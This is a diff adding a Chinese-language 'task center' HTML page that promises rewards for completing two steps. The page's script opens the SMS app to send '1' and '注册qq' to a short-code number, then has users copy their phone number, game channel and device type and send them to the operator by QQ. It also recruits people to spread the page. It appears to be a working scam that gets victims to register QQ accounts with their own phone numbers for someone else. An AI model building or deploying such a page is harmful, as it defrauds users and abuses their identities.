@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>任务中心 - 全屏美化版</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Microsoft YaHei", sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://pic.rmb.bdstatic.com/bjh/3edbf4202f/250224/922701dd3a3cb10e9fe01856ad44c594.jpeg') center/cover fixed;
+            color: #fff;
+            padding: 15px;
+            position: relative;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.7);
+            padding: 20px;
+            border-radius: 15px;
+            backdrop-filter: blur(5px);
+        }
+
+        .banner {
+            border: 2px solid #ffd700;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 10px;
+            background: rgba(255,215,0,0.1);
+        }
+
+        .task-panel {
+            display: grid;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .input-group {
+            display: grid;
+            gap: 10px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.9);
+            font-size: 16px;
+        }
+
+        .button-group {
+            display: grid;
+            gap: 10px;
+            grid-template-columns: 1fr 1fr;
+        }
+
+        .button {
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 16px;
+        }
+
+        #step1 { background: #00c853; }
+        #step1:disabled { background: #616161; }
+        #step2 { background: #2962ff; }
+        #step2:disabled { background: #616161; }
+        #copyBtn { background: #aa00ff; }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+                margin: 10px;
+            }
+            
+            .button {
+                padding: 12px;
+                font-size: 14px;
+            }
+            
+            .banner h3 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="banner">
+            <h3>🎉 任务公告</h3>
+            <p>▶ 完成以下两步领取奖励</p>
+            <p>▶ 完成后点击一键复制发送给我</p>
+            <p>⭕️手机号必须是发送短信的手机号</p>
+            <p>⭕️发送完信息第一时间截图发给我</p>           
+            <p>⭕️过时还要重新发以避免不必要的麻烦</p>
+            <p>⭕️免费招收代理，我给你无限生成拉满，你帮我找人一个人完成任务2r，</p>
+            <p>❗️<a href="tencent://message/?uin=3794069496">点击加我好友</a>❗️<a href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=IFs03CnppY3esrPSHAwaWlbiUoakcMMW&authKey=hurV6KHPAEX9rmIcFDST1nhQyrsIsxBTmu806ydekjZ6paZS2H%2F7DXWHWbb0jFgG&noverify=0&group_code=727175932">点击加入群聊</a></p>
+
+        </div>
+
+        <div class="task-panel">
+            <div class="input-group">
+                <input type="tel" id="userPhone" placeholder="输入手机号" pattern="[0-9]{11}">
+                <select id="channel">
+                    <option value="">选择游戏渠道</option>
+                    <option>4399</option>
+                    <option>top</option>
+                    <option>官服</option>
+                    <option>苹果官服</option>
+                </select>
+                <select id="deviceType">
+                    <option value="">选择手机类型</option>
+                    <option>苹果</option>
+                    <option>安卓</option>
+                </select>
+            </div>
+
+            <div class="button-group">
+                <button class="button" id="step1">1. 发送验证码</button>
+                <button class="button" id="step2" disabled>2. 注册验证</button>
+            </div>
+            <button class="button" id="copyBtn">📋 一键复制信息</button>
+        </div>
+    </div>
+
+    <script>
+        // 短信配置
+        const SMS = {
+            number: "106988881700511",
+            messages: {
+                1: "1",
+                2: "注册qq"
+            }
+        };
+
+        // 状态初始化
+        const initState = () => {
+            if (!localStorage.getItem('step1')) localStorage.setItem('step1', '0');
+            if (!localStorage.getItem('step2')) localStorage.setItem('step2', '0');
+            document.getElementById('step2').disabled = localStorage.getItem('step1') === '0';
+        };
+
+        // 短信发送处理
+        const sendSMS = (step) => {
+            try {
+                const uri = `sms:${SMS.number}?body=${encodeURIComponent(SMS.messages[step])}`;
+                
+                // 更新状态
+                localStorage.setItem(`step${step}`, '1');
+                if(step === 1) document.getElementById('step2').disabled = false;
+
+                // 双重跳转机制
+                window.location.href = uri;
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    link.href = uri;
+                    link.click();
+                }, 300);
+
+                // 发送状态检测
+                setTimeout(() => {
+                    if (!document.hidden) {
+                        const msg = `收件人：${SMS.number}\n内容：${SMS.messages[step]}`;
+                        navigator.clipboard.writeText(msg);
+                        alert('已帮您复制短信内容！');
+                    }
+                }, 5000);
+
+            } catch (e) {
+                alert('错误：' + e.message);
+            }
+        };
+
+        // 复制功能
+        const copyInfo = () => {
+            const info = [
+                `手机号：${document.getElementById('userPhone').value}`,
+                `渠道：${document.getElementById('channel').value}`,
+                `设备：${document.getElementById('deviceType').value}`
+            ].join('\n');
+
+            if (info.includes("undefined") || info.includes("null")) {
+                alert('请填写完整信息！');
+                return;
+            }
+
+            navigator.clipboard.writeText(info)
+                .then(() => alert('复制成功！'))
+                .catch(() => {
+                    const ta = document.createElement('textarea');
+                    ta.value = info;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    alert('已手动复制！');
+                });
+        };
+
+        // 事件绑定
+        window.onload = initState;
+        document.getElementById('step1').addEventListener('click', () => sendSMS(1));
+        document.getElementById('step2').addEventListener('click', () => sendSMS(2));
+        document.getElementById('copyBtn').addEventListener('click', copyInfo);
+    </script>
+</body>
+</html>
